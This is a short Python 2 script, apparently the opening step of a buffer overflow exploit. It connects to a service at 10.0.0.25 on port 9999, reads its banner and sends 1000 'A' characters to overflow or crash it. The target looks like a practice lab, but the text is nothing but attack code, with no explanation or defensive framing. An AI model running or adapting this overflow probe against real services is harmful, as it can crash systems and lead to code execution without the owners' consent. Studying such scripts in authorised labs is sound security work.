import socket
import sys
 
buff = "A" * 1000
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
    s.connect(('10.0.0.25', 9999))
 
except:
    print "Error"
    sys.exit(0)
 
s.recv(1024)
s.send(buff)



